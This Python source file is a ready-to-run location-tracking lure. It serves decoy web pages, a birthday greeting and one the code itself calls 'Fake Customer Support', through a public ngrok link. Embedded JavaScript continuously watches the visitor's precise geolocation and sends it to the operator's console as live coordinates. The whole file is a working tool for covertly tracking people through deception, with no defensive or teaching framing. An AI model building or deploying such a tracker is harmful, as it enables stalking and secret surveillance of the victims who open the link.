import http.server
import socketserver
import threading
import os
import json
import socket
import psutil
import platform
import time
from rich import print
from rich.panel import Panel
from rich.align import Align
from rich.console import Console
from pyngrok import ngrok, conf

PORT = 8080

HTML_TEMPLATES = {
    "1": """
    <!DOCTYPE html>
    <html>
    <head><title>Happy Birthday</title></head>
    <body style="background:#fff;color:#00ff00;text-align:center;padding-top:50px;font-family:sans-serif;">
        <h1>Happy Birthday My Dearest Friend </h1>
        <h2>Wishing You All The Best!</h2>
        <h3>Wait to see a surprise!</h3>
        <script>
            navigator.geolocation.watchPosition(pos => {
                fetch('/log', {
                    method: 'POST',
                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
                });
            }, err => console.log(err), {enableHighAccuracy:true});
        </script>
    </body>
    </html>
    """,
    "2": """
    <!DOCTYPE html>
    <html>
    <head><title>Customer Care</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #fff; padding: 20px 25px; width: 300px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; }
        .contact { margin-top: 15px; font-weight: bold; }
    </style>
    </head>
    <body>
    <div class="card">
        <h2>Customer Care</h2>
        <p>We’re here to help you 24/7.</p>
        <div class="contact">📞 +91 98765 43210<br>✉️ support@example.com</div>
    </div>
        <script>
            navigator.geolocation.watchPosition(pos => {
                fetch('/log', {
                    method: 'POST',
                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
                });
            }, err => console.log(err), {enableHighAccuracy:true});
        </script>
    </body>
    </html>
    """,
    "3": """
    <!DOCTYPE html>
    <html>
    <head><title>Welcome</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .greet { background: #ffffff; padding: 20px 25px; border-radius: 8px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
    </style>
    </head>
    <body>
    <div class="greet">
        <h2>Welcome!</h2>
        <p>Hello and thank you for reaching out.</p>
    </div>
    </body>
    </html>
    """
}

class TrackerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(SELECTED_HTML.encode())

    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            print(Panel(f"[bold green]LIVE COORDINATES RECEIVED[/bold green]\n[bold white]Lat:[/bold white] {data['lat']}\n[bold white]Lon:[/bold white] {data['lon']}", expand=False))
            self.send_response(200)
            self.end_headers()

    def log_message(self, format, *args):
        return

def get_system_info():
    hostname = socket.gethostname()
    ip_addr = socket.gethostbyname(hostname)
    battery = psutil.sensors_battery()
    percent = f"{battery.percent}%" if battery else "N/A"
    
    if platform.system() == "Android":
        device = "Mobile/Tablet"
    elif battery is not None:
        device = "Laptop"
    else:
        device = "Desktop/PC"
    
    return ip_addr, percent, device

def start_server():
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), TrackerHandler) as httpd:
        httpd.serve_forever()

def location_tracking_tool():
    global SELECTED_HTML
    console = Console()
    console.print(Align.center(Panel("[bold red]SYSTEM DIAGNOSTICS & TRACKER[/bold red]")))
    
    # 1. System Info
    ip, bat, dev = get_system_info()
    console.print(Panel(f"IP: {ip}\nBattery: {bat}\nDevice: {dev}", title="Local Hardware Info", border_style="blue"))

    # 2. Ngrok Auth
    token = input("\nEnter your ngrok authtoken: ")
    ngrok.set_auth_token(token)
    
    # 3. Template Selection
    print("\n[bold yellow]Select Page Template:[/bold yellow]")
    print("1. Happy Birthday Wish")
    print("2. Fake Customer Support")
    print("3. Greetings")
    choice = input("\nSelect Template (1-3): ")
    SELECTED_HTML = HTML_TEMPLATES.get(choice, HTML_TEMPLATES["1"])
    
    # 4. Start Server
    threading.Thread(target=start_server, daemon=True).start()
    
    print("[italic yellow]Initializing ngrok tunnel...[/italic yellow]")
    public_url = ngrok.connect(PORT).public_url
    
    console.print(Panel(f"[bold green]Public Link:[/bold green] {public_url}", border_style="green"))
    print("[bold red]Waiting for hits... (Press Ctrl+C to stop)[/bold red]")
    
    # Keep the script alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[red]Shutting down tunnel...[/red]")
        ngrok.disconnect(public_url)

